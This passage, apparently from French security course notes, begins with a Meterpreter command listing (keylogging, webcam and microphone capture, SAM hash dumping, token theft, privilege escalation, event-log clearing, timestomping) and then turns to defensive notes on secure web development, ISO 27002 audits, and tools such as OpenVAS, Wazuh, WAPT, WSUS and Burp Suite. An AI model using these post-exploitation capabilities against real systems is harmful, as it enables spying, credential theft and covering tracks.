    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
-----------------------

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
-------------------------------

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user desktop in real time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
-----------------------

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
-----------------------------

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
----------------------

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
--------------------------------

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
------------------------

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes

# Point a surveiller dans un serveur / client

Comptes

Services

Taches planifiés

Clé registre

WMI events



https://mitre-attack.github.io/attack-navigator/

# Développement sécurisé (web)

> 83% du trafic web est maintenant des appels API.
>
> L'API exposée formera une plus grande surface d'attaque que l'interface utilisateur dans 90 % des applications Web.



**Guide développement sécurisé**

https://owasp.org/www-project-developer-guide/



![image-20250124091619634](.\image-20250124091619634.png)

Dans un environnement Cloud : Sécurisé configuration coté environnement cloud et configuration coté client.

![image-20250124093520560](.\image-20250124093520560.png)

**Contrôler les autorisations d'accès dans les requêtes**

![image-20250124093837799](.\image-20250124093837799.png)

Exemple de faille utilisant un numéro de mobile comme identifiant pour accéder aux info du propriétaire

![image-20250124094008801](.\image-20250124094008801.png)

**WAF module pour firewall pour protection d'une application**

Exemple: Fortiweb

![image-20250124143734798](.\image-20250124143734798.png)

UTM chez fortinet

![image-20250124144808792](.\image-20250124144808792.png)

**Bonnes pratiques**

* Utiliser des UUIDs dans les URI plutot que des codes incrémentable ou basé sur un pattern spécifique (n° Id, n° téléphone, ...)
* Réduire les échanges au strict nécessaire (ne pas envoyer excessivement des données et laisser le client sélectionner les informations dont il a besoin)

# Scénario Quick Win

![image-20250122141505779](.\image-20250122141505779.png)

## Audit

**ISO27002**

S'évaluer et se donner une note puis essayer d'atteindre le niveau recommandé (généralement 80)

3-RSC\iso 27002.xlsx

https://fr.scribd.com/presentation/795086527/2024-11-21-Iso-27002-chap8

**Rechercher des comparaisons de produits (SIEM, SCANNER, ...)**

https://www.gartner.fr/fr

Exemple: SIEM

https://www.securonix.com/resources/2024-gartner-magic-quadrant-for-siem/



## Analyse de risques

Modèle MVI (menace, vulnérabilité, impact)

voir Ressources : "memos_257005.pdf", "iso 27002.xlsx" et fichiers "AR_*"

## Plan d'actions 

## Solutions à déployer

![image-20250123152841745](.\image-20250123152841745.png)

# Tests

## Nessus - Sous Licence

**Scanner de vulnérabilité**

## Greenbone (OpenVAS) - Libre

**Scanner de vulnérabilité**

Open VAS est un logiciel de scanner de vulnérabilité. Il est une alternative open-source à Nessus.

Son installation est simple via l'image préconfiguré téléchargeable.

https://www.greenbone.net/en/testnow/

La mise à jour de la base de données est extrêmement longue voir bloquante (+3j)

![image-20250123081400846](.\image-20250123081400846.png)

Interface très rudimentaire

## Wazhu - Free

**Serveur de log et analyseur CVE**

Windows / Linux : Agent SIEM

Linux : Serveur SIEM

Switchs / Firewall (utiliser syslog)

https://documentation.wazuh.com/current/user-manual/capabilities/log-data-collection/syslog.html

L'Agent remonte les événements des clients au serveur

![image-20250123172056208](.\image-20250123172056208.png)

**Exemple de réponse à un l'apparition d'un log**

![image-20250123173550636](.\image-20250123173550636.png)

![image-20250123173605081](.\image-20250123173605081.png)

![image-20250123173736456](.\image-20250123173736456.png)

![image-20250123173826176](.\image-20250123173826176.png)

## WATP - Sous Licence

**Distribution Applications / Mises à jour**

WATP permet de déployer facilement des logiciels et mises à jours Windows de façon automatisé et sécurisé et possibilités SNMP.

Essai/Tarifs: https://www.tranquil.it/tarifs/

Exemple 300 postes / 3 ans = 3000€ (1000€/an)

- Déployer, mettre à jour et supprimer des logiciels
- Déployer des systèmes d’exploitation
- Gérer les mises à jour Windows simplement
- Effectuer l’audit matériel et logiciel
- Effectuer l’inventaire complet du matériel, logiciels et paquets WAPT
- Déployer et mettre à jour les configurations
- Self-service différencié
- Gérer les droits d’accès
- Déployer par Unités organisationnelles
- Utiliser les dépôts secondaires
- Chiffrer les données depuis la console
- Exporter les données de reporting
- Authentifier des administrateurs avec Active Directory, LDAP, certificats personnels
- Configurer et gérer facilement les dépôts secondaires WAPT
- Librairie de Setup Helpers
- Envoyer des messages aux utilisateurs

**Serveur**

![image-20250123093642663](.\image-20250123093642663.png)

Le logiciel requière une licence, une version d'essai est possible sur demande.

![image-20250123094005565](.\image-20250123094005565.png)



![image-20250123140348250](.\image-20250123140348250.png)

**Client**

![image-20250123093725579](.\image-20250123093725579.png)

## WSUS

**Distribution Mises à jour Windows**

Windows Server Update Services (**WSUS**) est un service permettant de distribuer les mises à jour pour Windows  et d'autres applications Microsoft sur les différents ordinateurs  fonctionnant sous Windows au sein d'un parc informatique.

https://learn.microsoft.com/fr-fr/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus



## Burp Suite

**Burp Suite** est une application Java qui peut être utilisée pour la sécurisation ou effectuer des tests de pénétration sur les applications web. La suite est composée de différents outils comme un serveur proxy (Burp Proxy), robot d’indexation (Burp Spider), un outil d'intrusion (Burp  Intruder), un scanner de vulnérabilités (Burp Scanner) et un répéteur  HTTP (Burp Repeater)

https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://portswigger.net/burp&ved=2ahUKEwiz4Y3mgI6LAxUnXEEAHemNO2kQFnoECAsQAQ&usg=AOvVaw1wUaWiBmHu8R6v8LlxYuob